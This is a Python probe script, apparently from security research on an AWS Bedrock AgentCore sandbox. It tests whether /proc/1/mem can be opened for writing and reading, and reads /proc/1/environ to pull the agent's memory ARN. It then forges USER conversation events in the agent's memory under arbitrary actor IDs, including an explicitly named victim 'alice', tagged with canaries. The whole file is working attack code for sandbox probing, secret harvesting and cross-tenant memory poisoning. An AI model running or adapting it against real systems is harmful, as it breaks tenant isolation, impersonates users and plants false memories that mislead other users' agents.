"""probe2s_no_write.py — same as probe2r but with NO heap write.

Tests:
  - can we open /proc/1/mem r+b at all?
  - can we boto3.create_event under arbitrary actorIds?
  - can we read /proc/1/mem rb (Probe2N already confirmed yes, re-confirming here)
"""
import os, sys, json
from datetime import datetime, timezone

ALICE = os.environ.get('ALICE_ACTOR', '').strip()
CANARY = os.environ.get('PROBE_CANARY', 'p2s').strip()

print(f"P2S_BOOT alice={ALICE[:8] if ALICE else 'none'} canary={CANARY}")

# 1. Can we open r+b?
try:
    with open('/proc/1/mem', 'r+b') as m:
        print("MEM_OPEN_RW=ok")
except Exception as e:
    print(f"MEM_OPEN_RW_ERR={type(e).__name__}: {str(e)[:200]}")

# 2. Can we open rb?
try:
    with open('/proc/1/mem', 'rb') as m:
        print("MEM_OPEN_RD=ok")
except Exception as e:
    print(f"MEM_OPEN_RD_ERR={type(e).__name__}: {str(e)[:200]}")

# 3. Sidechannel CreateEvents
try:
    import boto3
    print("BOTO3_IMPORT=ok")
    bac = boto3.client('bedrock-agentcore', region_name=os.environ.get('AWS_REGION', 'us-east-1'))
    # discover memory id from /proc/1/environ
    memory_id = ''
    env_raw = open('/proc/1/environ', 'rb').read()
    for entry in env_raw.split(b'\x00'):
        if entry.startswith(b'AWS_MEMORY_ARN='):
            arn = entry.split(b'=', 1)[1].decode(errors='replace')
            if '/memory/' in arn:
                memory_id = arn.split('/memory/')[-1]
            break
    print(f"MEMORY_ID={memory_id}")
    if memory_id:
        for who, actor in [('alice_explicit', ALICE or 'fallback'), ('default_literal', 'default')]:
            try:
                sid = f'p2s-{who}-{CANARY}-{os.urandom(8).hex()}{os.urandom(16).hex()}'
                bac.create_event(memoryId=memory_id, actorId=actor, sessionId=sid,
                    eventTimestamp=datetime.now(timezone.utc),
                    payload=[{'conversational':{'role':'USER','content':{'text':
                        f'p2s side-channel under actor={actor[:12]} canary={CANARY}'}}}])
                print(f"SIDECHANNEL_OK actor={actor[:12]}")
            except Exception as ce:
                print(f"SIDECHANNEL_ERR actor={actor[:12]}: {type(ce).__name__}: {str(ce)[:120]}")
except Exception as e:
    print(f"BOTO3_ERR={type(e).__name__}: {str(e)[:200]}")

print(f"VERDICT=DONE_canary={CANARY}")
